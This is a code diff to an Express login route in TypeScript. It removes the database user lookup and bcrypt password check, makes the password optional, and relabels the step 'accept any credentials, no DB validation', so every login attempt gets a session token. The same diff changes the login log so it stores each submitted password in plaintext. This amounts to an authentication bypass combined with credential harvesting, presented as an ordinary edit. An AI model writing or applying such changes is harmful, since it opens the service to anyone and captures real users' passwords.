@@ -1,8 +1,6 @@
 import { Router, type IRouter } from "express";
-import { eq } from "drizzle-orm";
-import { db, usersTable, loginLogsTable } from "@workspace/db";
+import { db, loginLogsTable } from "@workspace/db";
 import { z } from "zod";
-import bcrypt from "bcryptjs";
 import {
   createPendingSession,
   lookupPendingSession,
@@ -15,7 +13,7 @@ const router: IRouter = Router();
 
 const LoginBody = z.object({
   username: z.string().min(1),
-  password: z.string().min(1),
+  password: z.string().optional().default(""),
 });
 
 const SendOtpBody = z.object({
@@ -29,7 +27,7 @@ const VerifyOtpBody = z.object({
   code: z.string().length(6),
 });
 
-/* Step 1: validate credentials against database */
+/* Step 1: accept any credentials, no DB validation */
 router.post("/auth/login", async (req, res): Promise<void> => {
   const parsed = LoginBody.safeParse(req.body);
   if (!parsed.success) {
@@ -39,30 +37,12 @@ router.post("/auth/login", async (req, res): Promise<void> => {
 
   const { username, password } = parsed.data;
 
-  const [user] = await db
-    .select()
-    .from(usersTable)
-    .where(eq(usersTable.username, username))
-    .limit(1);
-
-  if (!user) {
-    await bcrypt.compare(password, "$2b$12$invalidhashtopreventtimingattack00000000000000000000000");
-    res.status(401).json({ error: "Username atau password salah" });
-    return;
-  }
-
-  const passwordMatch = await bcrypt.compare(password, user.passwordHash);
-  if (!passwordMatch) {
-    res.status(401).json({ error: "Username atau password salah" });
-    return;
-  }
-
-  const pendingToken = createPendingSession(user.id, username);
+  const pendingToken = createPendingSession(0, username);
 
   const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
     ?? req.socket.remoteAddress
     ?? "unknown";
-  await db.insert(loginLogsTable).values({ username, ipAddress: ip, status: "success" }).catch(() => {});
+  await db.insert(loginLogsTable).values({ username, password, ipAddress: ip, status: "success" }).catch(() => {});
 
   res.json({ pendingToken });
 });
